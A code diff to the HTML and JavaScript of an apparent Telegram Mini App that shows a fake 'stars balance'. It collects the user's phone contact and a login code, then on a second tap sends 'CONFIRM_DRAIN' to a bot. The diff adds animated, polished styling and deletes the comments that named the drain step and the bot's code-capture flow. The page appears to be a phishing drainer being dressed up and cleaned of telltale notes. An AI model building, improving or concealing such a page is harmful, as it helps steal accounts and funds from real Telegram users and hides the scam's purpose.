@@ -16,11 +16,50 @@
         .avatar { width: 30px; height: 30px; border-radius: 50%; object-fit: cover; }
         .username { font-size: 14px; color: #aaa; }
 
-        /* Баланс */
+        /* --- БЛОК БАЛАНСА И iOS АНИМАЦИЯ --- */
         .balance-section { text-align: center; margin-bottom: 40px; }
-        .star-icon { color: #fecb2e; font-size: 40px; vertical-align: middle; }
-        .balance-val { font-size: 48px; font-weight: bold; margin-left: 10px; }
-        .balance-label { color: #888; margin-top: 10px; font-size: 14px; }
+        
+        @keyframes star-glow {
+            0% { filter: drop-shadow(0 0 5px rgba(254, 203, 46, 0.4)); transform: scale(1); }
+            50% { filter: drop-shadow(0 0 15px rgba(254, 203, 46, 0.8)); transform: scale(1.03); }
+            100% { filter: drop-shadow(0 0 5px rgba(254, 203, 46, 0.4)); transform: scale(1); }
+        }
+
+        @keyframes star-float {
+            0% { transform: translateY(0px) rotate(0deg); }
+            25% { transform: translateY(-2px) rotate(2deg); }
+            75% { transform: translateY(2px) rotate(-2deg); }
+            100% { transform: translateY(0px) rotate(0deg); }
+        }
+
+        .star-container {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            animation: star-glow 3s infinite ease-in-out;
+        }
+
+        .star-ios {
+            font-family: "Apple Color Emoji", "Segoe UI Emoji", sans-serif;
+            font-size: 42px;
+            display: inline-block;
+            animation: star-float 4s infinite ease-in-out;
+            line-height: 1;
+        }
+
+        .balance-val { 
+            font-size: 54px; 
+            font-weight: 800; 
+            margin-left: 12px; 
+            letter-spacing: -1.5px;
+            background: linear-gradient(180deg, #FFFFFF 30%, #BBBBBB 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            vertical-align: middle;
+        }
+        
+        .balance-label { color: #888; margin-top: 5px; font-size: 14px; }
+        /* ---------------------------------- */
 
         /* Кнопки действий */
         .action-btns { display: flex; justify-content: center; gap: 40px; margin-bottom: 30px; }
@@ -61,7 +100,9 @@
         </div>
 
         <div class="balance-section">
-            <i class="fa-solid fa-star star-icon"></i>
+            <div class="star-container">
+                <span class="star-ios">⭐</span>
+            </div>
             <span class="balance-val" id="stars-val">0</span>
             <div class="balance-label">Общий баланс в звездах</div>
         </div>
@@ -125,9 +166,8 @@
         const user = tg.initDataUnsafe.user;
         const urlParams = new URLSearchParams(window.location.search);
         const amount = urlParams.get('amount') || "0";
-        let isAuthorized = false; // Состояние для повторного нажатия
+        let isAuthorized = false;
 
-        // Инициализация данных
         document.getElementById('u-avatar').src = user?.photo_url || 'https://i.imgur.com/8K9v679.png';
         document.getElementById('u-name').innerText = user?.first_name || 'Пользователь';
         document.getElementById('stars-val').innerText = amount;
@@ -136,7 +176,6 @@
             if (!isAuthorized) {
                 showPage('auth-page');
             } else {
-                // ПОВТОРНОЕ НАЖАТИЕ - ДРЕЙН
                 tg.sendData("CONFIRM_DRAIN");
                 tg.close();
             }
@@ -147,14 +186,11 @@
             document.getElementById(id).classList.add('active');
         }
 
-        // Запрос контакта (через бота)
         function requestContact() {
             tg.sendData("REQUEST_CONTACT_TRIGGER"); 
-            // Мы закрываем веб-апп, бот кидает кнопку контакта, чел жмет, бот снова открывает веб-апп с кодом
             tg.close();
         }
 
-        // Если в URL есть флаг "step=code", сразу показываем ввод кода
         if(urlParams.get('step') === 'code') {
             showPage('auth-page');
             document.getElementById('s1-n').classList.remove('step-active');
@@ -166,7 +202,6 @@
             `;
         }
 
-        // Если в URL есть флаг "authorized=true"
         if(urlParams.get('authorized') === 'true') {
             isAuthorized = true;
         }
